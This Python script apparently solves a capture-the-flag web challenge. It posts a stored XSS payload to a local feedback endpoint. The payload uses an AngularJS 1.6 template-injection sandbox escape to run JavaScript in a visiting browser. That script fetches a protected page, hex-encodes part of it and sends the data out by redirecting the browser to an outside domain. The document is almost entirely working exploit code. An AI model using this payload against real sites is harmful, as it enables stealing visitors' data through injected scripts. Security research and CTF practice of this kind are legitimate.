#!/usr/bin/env python3

import requests
import json
import time

real_url = "localhost:1337"
base_url = 'http://' + real_url + '/api/submit'

def send_payload(url, payload):
    response = requests.post(url, data=payload, verify=False)
    return response.content

def create_payload():
    payload = """<script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js> </script><K Ng-App>{{$new.constructor('
        const dostuff = async () => {
            const res = await fetch("http://127.0.0.1:1337/alien");
            const text = await res.text();
            const obj = document.createElement("div");
            obj.innerHTML = text;
            output = obj.getElementsByClassName("edition")[0].innerHTML.replaceAll(/./g,(m)=>m.charCodeAt(0).toString(16));
            window.location = "https://jasonn.dev/" + output;
        };
        dostuff();
        ')()}}"""
    return {"feedback": payload}

"""
while(output.charCodeAt(0).toString(2)[0] === "1") {
    await fetch("http://127.0.0.1:1337/alien");
}
"""

def do_real():
    val = send_payload(base_url, create_payload())
    print(val)

"""
time.sleep(29.5)
for i in range(10):
    time.sleep(0.5)
    val = requests.post(base_url, data={"a":"b"}, verify=False)
    print(val)
"""

do_real()

